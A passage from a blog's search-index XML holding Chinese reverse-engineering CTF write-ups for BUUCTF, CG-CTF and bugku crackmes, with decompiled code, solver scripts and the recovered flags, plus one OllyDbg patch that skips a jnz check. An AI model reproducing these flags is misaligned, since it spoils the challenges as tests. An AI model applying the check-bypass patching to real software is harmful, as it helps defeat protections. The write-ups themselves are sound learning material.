&quot;adsfkndcls&quot;;    char text[] = &quot;killshadow&quot;;//通过放缩，j只能取0-3之间    for (int j = 0; j &lt; 4; ++j) {        for (v2 = 0; v2 &lt; 10; ++v2) {            v1 = text[v2] - 97 + 26 * j - 97 + key[v3++ % v5] + 39;            if ((v1 &gt;= 65 &amp;&amp; v1 &lt;= 90) || (v1 &gt;= 97 &amp;&amp; v1 &lt;= 122)) {                flag[v2] = v1;                if (++n == 10) {                    printf(&quot;flag{%s}\n&quot;, flag);                    return 0;                }            }        }    }    return 0;}</code></pre><p>这里的j是用来逆向取余运算时候遍历，放缩之后得到一个范围，然后计算就可以了</p><pre><code>flag{KLDQCUDFZO}</code></pre><h4 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a>Java逆向解密</h4><p>第一次做Java逆向，顺便也熟悉熟悉Java，所以逆向程序也是用Java写的</p><p>附件打开是class文件，IDEA直接可以反编译，反编译出来的代码很简单</p><pre><code class="java">import java.util.ArrayList;import java.util.Scanner;public class Reverse {    public Reverse() {    }    public static void main(String[] args) {        Scanner s = new Scanner(System.in);        System.out.println(&quot;Please input the flag ：&quot;);        String str = s.next();        System.out.println(&quot;Your input is ：&quot;);        System.out.println(str);        char[] stringArr = str.toCharArray();        Encrypt(stringArr);    }    public static void Encrypt(char[] arr) {        ArrayList&lt;Integer&gt; Resultlist = new ArrayList();        for(int i = 0; i &lt; arr.length; ++i) {            int result = arr[i] + 64 ^ 32;            Resultlist.add(result);        }        int[] KEY = new int[]{180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65};        ArrayList&lt;Integer&gt; KEYList = new ArrayList();        for(int j = 0; j &lt; KEY.length; ++j) {            KEYList.add(KEY[j]);        }        System.out.println(&quot;Result:&quot;);        if (Resultlist.equals(KEYList)) {            System.out.println(&quot;Congratulations！&quot;);        } else {            System.err.println(&quot;Error！&quot;);        }    }}</code></pre><p>把KEY每个值都减去64^32就好了，没什么难度，所以试试用Java写，练练手</p><pre><code class="java">package com.company;import java.util.ArrayList;public class Main {    public static void main(String[] args) {        int[] KEY = new int[]{180, 136, 137, 147, 191, 137, 147, 191, 148, 136, 133, 191, 134, 140, 129, 135, 191, 65};        ArrayList&lt;Integer&gt; resultList = new ArrayList&lt;&gt;();        for (int value : KEY) {            resultList.add(value - 64 ^ 32);        }//        System.out.println(resultList);        StringBuilder s = new StringBuilder();        for (int value:resultList){            s.append((char)value);        }        System.out.println(&quot;flag{&quot;+s+&quot;}&quot;);    }}</code></pre><p>直接输出flag</p><pre><code>flag{This_is_the_flag_!}</code></pre><h4 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h4><p>不管是apktool反编译还是直接cfr反编译到代码，都可以找到一串很像flag的字符数组</p><pre><code>pvkq{m164675262033l4m49lnp7p9mnk28k75}</code></pre><p>直接凯撒密码解密，a与k之间相差10，所以key=10</p><pre><code>flag{c164675262033b4c49bdf7f9cda28a75}</code></pre><h4 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h4><p>直接<a href="http://tool.chacuo.net/cryptrsakeyparse" target="_blank" rel="noopener">解析公钥</a>，然后暴力分解解密就可以了</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>BUUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CGCTF-re部分题解</title>
    <link href="/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/01/11/CGCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>CG-CTF是南邮的平台，题目都很不错，这里记录一下部分题解决题目的思路和方法</p><a id="more"></a><h4 id="Hello-RE"><a href="#Hello-RE" class="headerlink" title="Hello,RE!"></a>Hello,RE!</h4><p>打开程序，发现输入flag，用OD打开，注意到是将输入的字符串和flag直接进行比较，所以单步调试直接找到flag<br><img src="https://s2.ax1x.com/2020/02/13/1qp7a4.png" srcset="/img/loading.gif" alt="Hello,RE!-1"></p><h4 id="ReadAsm2"><a href="#ReadAsm2" class="headerlink" title="ReadAsm2"></a>ReadAsm2</h4><p>这题考的是直接读汇编的能力，代码贴在下面</p><pre><code class="c++">int main(int argc, char const *argv[]){  char input[] = {0x0,  0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,                  0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,                  0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c};  func(input, 28);  printf(&quot;%s\n&quot;,input+1);  return 0;}</code></pre><pre><code class="asm">00000000004004e6 &lt;func&gt;:  4004e6: 55                    push   rbp  4004e7: 48 89 e5              mov    rbp,rsp  4004ea: 48 89 7d e8           mov    QWORD PTR [rbp-0x18],rdi  4004ee: 89 75 e4              mov    DWORD PTR [rbp-0x1c],esi  4004f1: c7 45 fc 01 00 00 00  mov    DWORD PTR [rbp-0x4],0x1  4004f8: eb 28                 jmp    400522 &lt;func+0x3c&gt;  4004fa: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]  4004fd: 48 63 d0              movsxd rdx,eax  400500: 48 8b 45 e8           mov    rax,QWORD PTR [rbp-0x18]  400504: 48 01 d0              add    rax,rdx  400507: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]  40050a: 48 63 ca              movsxd rcx,edx  40050d: 48 8b 55 e8           mov    rdx,QWORD PTR [rbp-0x18]  400511: 48 01 ca              add    rdx,rcx  400514: 0f b6 0a              movzx  ecx,BYTE PTR [rdx]  400517: 8b 55 fc              mov    edx,DWORD PTR [rbp-0x4]  40051a: 31 ca                 xor    edx,ecx  40051c: 88 10                 mov    BYTE PTR [rax],dl  40051e: 83 45 fc 01           add    DWORD PTR [rbp-0x4],0x1  400522: 8b 45 fc              mov    eax,DWORD PTR [rbp-0x4]  400525: 3b 45 e4              cmp    eax,DWORD PTR [rbp-0x1c]  400528: 7e d0                 jle    4004fa &lt;func+0x14&gt;  40052a: 90                    nop  40052b: 5d                    pop    rbp  40052c: c3                    ret</code></pre><p>发现这段汇编的作用就是实现input[i]^i，所以实现上面代码输出得到flag</p><pre><code class="python">s = [0x0, 0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,     0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,     0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66, 0x1c]for i in range(len(s)):    s[i] ^= iout = &#39;&#39;for i in range(len(s)):    out += chr(s[i])print(out)</code></pre><p>输出flag为：</p><pre><code class="flag">flag{read_asm_is_the_basic}</code></pre><h4 id="Py交易"><a href="#Py交易" class="headerlink" title="Py交易"></a>Py交易</h4><p>本题是python的反编译，使用在线工具或uncompyle6将pyc文件反编译，得到代码</p><pre><code class="python">import base64def encode(message):    s = &#39;&#39;    for i in message:        x = ord(i) ^ 32        x = x + 16        s += chr(x)    return base64.b64encode(s)correct = &#39;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#39;flag = &#39;&#39;print &#39;Input flag:&#39;flag = raw_input()if encode(flag) == correct:    print &#39;correct&#39;else:    print &#39;wrong&#39;import base64def encode(message):    s = &#39;&#39;    for i in message:        x = ord(i) ^ 32        x = x + 16        s += chr(x)    return base64.b64encode(s)correct = &#39;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#39;flag = &#39;&#39;print &#39;Input flag:&#39;flag = raw_input()if encode(flag) == correct:    print &#39;correct&#39;else:    print &#39;wrong&#39;</code></pre><p>研究代码，发现我们只要将correct逆向解密，就可以得到正确的flag，所以得到如下exp：</p><pre><code class="python">import base64correct = &#39;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#39;correct = str(base64.b64decode(correct))  # ^SdVkT#S ]`Y\\!^)\x8f\x80ism# print(correct)correct = &#39;^SdVkT#S ]`Y\\!^)\x8f\x80ism&#39;flag = &#39;&#39;for s in correct:    x = ord(s)    x -= 16    i = chr(x ^ 32)    flag += iprint(flag)</code></pre><p>输出flag为：</p><pre><code class="flag">nctf{d3c0mpil1n9_PyC}</code></pre><h4 id="WxyVM"><a href="#WxyVM" class="headerlink" title="WxyVM"></a>WxyVM</h4><p>下载下来不知道是什么文件，记事本打开，开头ELF，所以直接拖进IDA反编译，main函数如下：</p><pre><code class="c++">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v4; // [rsp+Bh] [rbp-5h]  signed int i; // [rsp+Ch] [rbp-4h]  puts(&quot;[WxyVM 0.0.1]&quot;);  puts(&quot;input your flag:&quot;);  scanf(&quot;%s&quot;, &amp;byte_604B80);  v4 = 1;  sub_4005B6();  if ( strlen(&amp;byte_604B80) != 24 )    v4 = 0;  for ( i = 0; i &lt;= 23; ++i )  {    if ( *(&amp;byte_604B80 + i) != dword_601060[i] )      v4 = 0;  }  if ( v4 )    puts(&quot;correct&quot;);  else    puts(&quot;wrong&quot;);  return 0LL;}</code></pre><p>一开始认为需要输入一个24位的flag，然后和dword_601060每一位都相等即可，但是中间的sub_4005B6()函数对我们输入的flag还进行了一些变换，所以需要把dword_601060对应的进行反变换才能得到应该输入的正确的flag</p><p>sub_4005B6()函数如下：</p><pre><code class="c++">__int64 sub_4005B6(){  unsigned int v0; // ST04_4  __int64 result; // rax  signed int i; // [rsp+0h] [rbp-10h]  char v3; // [rsp+8h] [rbp-8h]  for ( i = 0; i &lt;= 14999; i += 3 )  {    v0 = byte_6010C0[i];    v3 = byte_6010C0[i + 2];    result = v0;    switch ( v0 )    {      case 1u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) += v3;        break;      case 2u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) -= v3;        break;      case 3u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) ^= v3;        break;      case 4u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) *= v3;        break;      case 5u:        result = byte_6010C0[i + 1];        *(&amp;byte_604B80 + result) ^= *(&amp;byte_604B80 + byte_6010C0[i + 2]);        break;      default:        continue;    }  }  return result;}</code></pre><p>用IDA将byte_6010C0导出，用python进行逆向处理</p><pre><code class="python">s = [0xc4, 0x34, 0x22, 0xb1, 0xd3, 0x11, 0x97, 0x7, 0xdb, 0x37, 0xc4, 0x6, 0x1d, 0xfc, 0x5b, 0xed, 0x98, 0xdf, 0x94,0xd8, 0xb3, 0x84, 0xcc, 0x8]# dword与char比较，只取最后一位一个字节with open(&#39;export_results.txt&#39;) as f: #文件里是导出的byte_6010C0    t = f.read().split(&#39; &#39;)# print(len(t))for i in range(5000):    v0 = int(t[3 * (4999 - i)], 16)    v3 = int(t[3 * (4999 - i) + 2], 16)    result = int(t[3 * (4999 - i) + 1], 16)    if v0 == 1:        s[result] -= v3    elif v0 == 2:        s[result] += v3    elif v0 == 3:        s[result] ^= v3    elif v0 == 4:        s[result] /= v3    elif v0 == 5:        s[result] ^= s[v3]    else:        continueprint(&#39;&#39;.join([str(chr(int(i) % 128)) for i in s]))</code></pre><p>这里有两件事需要注意，第一是dword只需要取最后一个字节，第二是逆运算时要从最后三位向前计算，最后输出flag: </p><pre><code class="flag">nctf{Embr4ce_Vm_j0in_R3}</code></pre><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>极其无聊的迷宫题……</p><p>找到地图、起点终点和上下左右分别对应的键就可以了</p><pre><code>nctf{o0oo00O000oooo..OO}</code></pre><h4 id="WxyVM2"><a href="#WxyVM2" class="headerlink" title="WxyVM2"></a>WxyVM2</h4><p>拖进IDA反编译，发现函数非常大，操作特别多，但是仔细看发现最后要验证的都是byte类型，所有对dword的操作都是无效的，所以把所有操作拷贝到文件(export_results.txt)中，先进行过滤操作，过滤出需要的操作,最后的验证过程如下：</p><pre><code class="C++">for ( i = 0; i &lt;= 24; ++i )  {    if ( *(&amp;byte_694100 + i) != dword_694060[i] )      v4 = 0;  }  if ( v4 )    puts(&quot;correct&quot;);  else    puts(&quot;wrong&quot;);  return 0LL;</code></pre><p>所以操作之后的数组和dword_694060数组的每个数的最后一位相同，将数组导出，进行逆运算得到原来输入的flag，python代码如下：</p><pre><code class="python">import rewith open(&#39;export_results.txt&#39;) as f:    s = &#39;&#39;    a = f.readline()    while a:        if re.match(r&#39;(.*)byte_6941(.*);&#39;, a):            s += a        a = f.readline()    with open(&#39;s.txt&#39;, &#39;w+&#39;) as ff:        s = s.split(&#39;\n&#39;)        n = len(s)        # print(len(s))        # print(s)        for i in range(n):            ff.write(s[n - 1 - i].strip() + &#39;\n&#39;)ss = [0xC0, 0x85, 0xF9, 0x6C, 0xE2, 0x14, 0xBB, 0xe4, 0xd, 0x59, 0x1c, 0x23, 0x88, 0x6e, 0x9b, 0xca, 0xba, 0x5c, 0x37,      0xfff, 0x48, 0xd8, 0x1f, 0xab, 0xa5]with open(&#39;s.txt&#39;) as f:    a = f.readline()    while a:        # print(re.match(r&#39;(.*)byte_6941(.*);&#39;, a).groups())        if not re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(1).strip():            s = re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(2).split(&#39; &#39;)            # print(s)            i = int(s[0], 16)            # print(i)            i1 = str(ss[i])            if s[1] == &#39;+=&#39;:                sub = &#39;-&#39;            elif s[1] == &#39;-=&#39;:                sub = &#39;+&#39;            else:                sub = &#39;^&#39;            if re.match(r&#39;(.*)u&#39;, s[2]):                s2 = re.match(r&#39;(.*)u&#39;, s[2]).group(1)            else:                s2 = s[2]            exp = i1 + sub + s2            ss[i] = eval(exp) % 128        else:            s = re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(2).split(&#39; &#39;)            # print(s)            i = int(s[0], 16)            # print(i)            i1 = str(ss[i])            if re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(1).strip() == &#39;++&#39;:                sub = &#39;-&#39;            if re.match(r&#39;(.*)byte_6941(.*);&#39;, a).group(1).strip() == &#39;--&#39;:                sub = &#39;+&#39;            exp = i1 + sub + &#39;1&#39;            ss[i] = eval(exp) % 128        a = f.readline()    # print(ss)print(&#39;&#39;.join([str(chr(i % 128)) for i in ss]))</code></pre><p>这里要注意一点，python没有++和–操作，所以直接++和–的传唤算不出正确值，在这里卡了一会儿才发现问题。</p><p>运行程序输出flag：</p><pre><code class="flag">nctf{th3_vM_w1th0ut_dAta}</code></pre><h4 id="你大概需要一个优秀的mac"><a href="#你大概需要一个优秀的mac" class="headerlink" title="你大概需要一个优秀的mac"></a>你大概需要一个优秀的mac</h4><p>这是一个macos程序，没法直接打开，所以还是拖进IDA反编译，发现需要输入一个56位的flag，然后经过几个函数处理之后与一个数组进行比较，相同则输入的是正确的flag，所以还是一样进行一个逆运算</p><p>反编译出来的代码如下：</p><pre><code class="c++">  scanf(&quot;%s&quot;, &amp;v4);  if ( strlen(&amp;v4) != 56 )  {    puts((const char *)err);    exit(0);  }  __strcpy_chk(input, &amp;v4, 100LL);  func1((__int64)input);  xfun1();  xfun2();  xfun3();  xfun4();  xfun5();  check();//func1  for ( i = 0; i &lt; 57; ++i ) //这里应该是56？  {    *(_BYTE *)(a1 + i) ^= 0xDEu;  }//xfun1  for ( i = 0; i &lt; 10; ++i )  {    input[i] ^= 0xADu;  }//xfun2  for ( i = 0; i &lt; 10; ++i )  {    input[i + 10] ^= 0xBEu;  }//xfun3  for ( i = 0; i &lt; 10; ++i )  {    input[i + 20] ^= 0xEFu;  }//xfun4  for ( i = 0; i &lt; 10; ++i )  {    input[i + 30] ^= 0xABu;  }//xfun5  for ( i = 0; i &lt; 16; ++i )  {    input[i + 40] ^= 0xEFu;  }//check  memcpy(v2, &amp;byte_100000ED0, 0xE0uLL);  for ( i = 0; i &lt; 56; ++i )  {    if ( (char)input[i] != v2[i] )    {      puts((const char *)err);      exit(0);    }  }</code></pre><p>所以将byte_100000ED0处的数组导出，进行逆运算，代码如下：</p><pre><code class="python">s = [0x15, 0x1F, 0x12, 0x14, 0x08, 0x3A, 0x46, 0x2C, 0x07, 0x1B, 0x51, 0x13, 0x3F, 0x57, 0x08, 0x05, 0x3F, 0x30, 0x32,     0x51, 0x52, 0x02, 0x6E, 0x78, 0x16, 0x7C, 0x6E, 0x61, 0x70, 0x48, 0x1C, 0x3B, 0x32, 0x2A, 0x13, 0x45, 0x07, 0x2A,     0x18, 0x0C, 0x6E, 0x41, 0x70, 0x04, 0x06, 0x6E, 0x5C, 0x00, 0x42, 0x45, 0x70, 0x5A, 0x02, 0x04, 0x0E, 0x4C]for i in range(10):    s[i]^=0xADfor i in range(10,20):    s[i]^=0xBEfor i in range(20,30):    s[i]^=0xEFfor i in range(30,40):    s[i]^=0xABfor i in range(40,56):    s[i]^=0xEFfor i in range(56):    s[i]^=0xDEprint(&#39;&#39;.join([str(chr(i%128)) for i in s]))</code></pre><p>运行程序输出flag：</p><pre><code class="flag">flag{I5_th1s_7he_PR1c3_I&#39;M_PAyiNG_f0r_my_pA57_m1stAk35?}</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>CG-CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bugku-re部分题解</title>
    <link href="/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"/>
    <url>/2020/01/11/bugku-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>这里记录一下bugku平台上一些re题的题解</p><a id="more"></a><h4 id="入门逆向"><a href="#入门逆向" class="headerlink" title="入门逆向"></a>入门逆向</h4><p>直接拖进IDA反编译</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpxsK.png" srcset="/img/loading.gif" alt="入门逆向-1"></p><p>直接可以看到flag</p><h4 id="Easy-vb"><a href="#Easy-vb" class="headerlink" title="Easy_vb"></a>Easy_vb</h4><p>IDA或OD反编译，搜索字符串</p><p><img src="https://s2.ax1x.com/2020/02/13/1qpXxx.png" srcset="/img/loading.gif" alt="Easy_vb-1"><br>看到有flag样式的字符串，是MCTF比赛的题，bugku上需要提交flag(xxx)，所以把MCTF改成flag{}</p><h4 id="Easy-Re"><a href="#Easy-Re" class="headerlink" title="Easy_Re"></a>Easy_Re</h4><p>用OD调试，搜索字符串，找到需要我们输入字符串的位置：<br><img src="https://s2.ax1x.com/2020/02/13/1qpLGR.png" srcset="/img/loading.gif" alt="Easy_Re-1"><br>发现提示语和%s，找到输入字符串的位置，加断点单步调试<br><img src="https://s2.ax1x.com/2020/02/13/1qpOR1.png" srcset="/img/loading.gif" alt="Easy_Re-2"><br>程序会把输入的字符串和flag进行比较，相同则通过，在寄存器中找到正确的flag</p><h4 id="游戏过关"><a href="#游戏过关" class="headerlink" title="游戏过关"></a>游戏过关</h4><p>这题可以有至少三种解法：<br>1、第一种解法<br>直接游戏通关，很简单，依次输入1-8即可<br><img src="https://s2.ax1x.com/2020/02/13/1qpzqO.png" srcset="/img/loading.gif" alt="游戏过关-1"><br>2、使用OD修改程序<br>首先查找字符串找到输出flag关键函数<br><img src="https://s2.ax1x.com/2020/02/13/1q9pZD.png" srcset="/img/loading.gif" alt="游戏过关-2"><br>找到如图所示函数的起始地址，跳转两次找到关键判断<br><img src="https://s2.ax1x.com/2020/02/13/1q9CIH.png" srcset="/img/loading.gif" alt="游戏过关-3"><br>可以看到jnz指令进行了跳转，如果没有跳转，将会执行输出flag的函数，现在修改程序，将跳转过后的指令修改为输出flag指令<br><img src="https://s2.ax1x.com/2020/02/13/1q9iid.png" srcset="/img/loading.gif" alt="游戏过关-4"><br>直接运行程序，输入任意数字都可得到flag<br><img src="https://s2.ax1x.com/2020/02/13/1q9FJA.png" srcset="/img/loading.gif" alt="游戏过关-5"><br>3、进行解码解出flag<br>可在上图4-2中看到处理flag的部分，将下面的16进制进行解码即可都得到flag</p><h4 id="逆向入门"><a href="#逆向入门" class="headerlink" title="逆向入门"></a>逆向入门</h4><p>下载下来admin.exe，发现打不开，peid检查发现不是PE程序，用文本编辑器打开，发现时图片转base64，转成图片得到二维码扫描得到flag</p><h4 id="love"><a href="#love" class="headerlink" title="love"></a>love</h4><p>IDA打开反编译，找到输出部分<br><img src="https://s2.ax1x.com/2020/02/13/1qpvM6.png" srcset="/img/loading.gif" alt="love-1"><br>发现进行了处理之后将两个base64比较，如果相同就输出flag正确，所以只要将Str2进行反变换就得到了正确的flag</p><pre><code class="python">import base64s = &quot;e3nifIH9b_C@n@dH&quot;flag = &quot;&quot;for i in range(len(s)):    flag += chr(ord(s[i]) - i)flag = base64.b64decode(flag)print(flag)</code></pre>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>re</tag>
      
      <tag>bugku</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2019/12/30/hello-world/"/>
    <url>/2019/12/30/hello-world/</url>
    
    <content type="html"><![CDATA[<p>My first post to say “Hello”.</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
